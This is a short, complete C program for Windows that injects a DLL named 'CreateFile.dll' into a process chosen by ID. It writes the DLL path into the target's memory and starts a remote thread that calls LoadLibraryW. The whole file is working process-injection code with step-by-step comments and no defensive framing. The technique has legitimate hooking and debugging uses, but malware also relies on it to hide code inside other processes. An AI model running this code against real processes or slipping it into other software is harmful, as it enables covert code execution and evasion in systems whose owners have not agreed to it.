#include <Windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
    HANDLE processHandle;                         // Handle to the target process
    PVOID remoteBuffer;                           // Buffer in the target process to store the DLL path
    wchar_t dllPath[] = TEXT("CreateFile.dll");         // Path to the DLL to be injected

    printf("Injecting DLL to PID: %i\n", atoi(argv[1]));

    // Open a handle to the target process
    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
    if (processHandle == NULL) {
        printf("Failed to open the target process.\n");
        return 1;
    }
    printf("Target process opened successfully.\n");

    // Allocate a remote buffer in the target process
    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);
    if (remoteBuffer == NULL) {
        printf("Failed to allocate remote buffer in the target process.\n");
        CloseHandle(processHandle);
        return 1;
    }
    printf("Remote buffer allocated successfully.\n");

    // Write the DLL path to the remote buffer in the target process
    if (!WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL)) {
        printf("Failed to write DLL path to the remote buffer.\n");
        VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return 1;
    }
    printf("DLL path written to the remote buffer successfully.\n");

    // Get the address of the LoadLibraryW function in the Kernel32 module
    PTHREAD_START_ROUTINE threadStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
    if (threadStartRoutineAddress == NULL) {
        printf("Failed to get the address of LoadLibraryW function.\n");
        VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return 1;
    }
    printf("LoadLibraryW function address obtained successfully.\n");

    // Create a remote thread in the target process that will execute the LoadLibraryW function with the DLL path as a parameter
    HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, threadStartRoutineAddress, remoteBuffer, 0, NULL);
    if (remoteThread == NULL) {
        printf("Failed to create a remote thread in the target process.\n");
        VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return 1;
    }
    printf("Remote thread created successfully.\n");

    // Wait for the remote thread to finish
    WaitForSingleObject(remoteThread, INFINITE);
    printf("Remote thread execution completed.\n");

    //printf("\nPress Any Key!\n");
    //getchar();

    // Close the handle to the remote thread
    CloseHandle(remoteThread);
    printf("Remote thread handle closed.\n");

    // Free the remote buffer in the target process
    VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
    printf("Remote buffer freed.\n");

    // Close the handle to the target process
    CloseHandle(processHandle);
    printf("Target process handle closed.\n");

    return 0;
}
